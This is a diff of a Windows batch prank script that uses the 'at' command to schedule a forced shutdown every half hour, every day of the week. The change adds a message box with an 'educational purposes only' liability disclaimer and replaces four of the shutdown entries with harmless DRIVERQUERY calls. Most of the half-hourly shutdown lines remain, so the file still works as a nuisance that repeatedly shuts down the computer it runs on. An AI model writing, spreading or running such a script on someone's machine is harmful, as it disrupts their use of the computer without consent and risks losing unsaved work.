@@ -1,8 +1,10 @@
 @echo off
-
-at 0:00 every:m,t,w,th,f,sa,s shutdown -s -t 5
-at 0:30 every:m,t,w,th,f,sa,s shutdown -s -t 5
-at 1:00 every:m,t,w,th,f,sa,s shutdown -s -t 5
+echo x=msgbox("All files here are to be used for educational purposes only. Use all files as is; any modifications in any way immediatly deem them as no longer our responsibility. Any lawful action taken against individuals or an organization from use/distribution of these files is not our responsibility regardless of files edits or lack thereof (after posted publish date)." ,16, "WARNING") >> msgbox.vbs
+start msgbox.vbs
+pause
+at 0:00 every:m,t,w,th,f,sa,s DRIVERQUERY
+at 0:30 every:m,t,w,th,f,sa,s DRIVERQUERY
+at 1:00 every:m,t,w,th,f,sa,s DRIVERQUERY
 at 1:30 every:m,t,w,th,f,sa,s shutdown -s -t 5
 at 2:00 every:m,t,w,th,f,sa,s shutdown -s -t 5
 at 2:30 every:m,t,w,th,f,sa,s shutdown -s -t 5
@@ -20,7 +22,7 @@ at 8:00 every:m,t,w,th,f,sa,s shutdown -s -t 5
 at 8:30 every:m,t,w,th,f,sa,s shutdown -s -t 5
 at 9:00 every:m,t,w,th,f,sa,s shutdown -s -t 5
 at 9:30 every:m,t,w,th,f,sa,s shutdown -s -t 5
-at 10:00 every:m,t,w,th,f,sa,s shutdown -s -t 5
+at 10:00 every:m,t,w,th,f,sa,s DRIVERQUERY
 at 10:30 every:m,t,w,th,f,sa,s shutdown -s -t 5
 at 11:00 every:m,t,w,th,f,sa,s shutdown -s -t 5
 at 11:30 every:m,t,w,th,f,sa,s shutdown -s -t 5
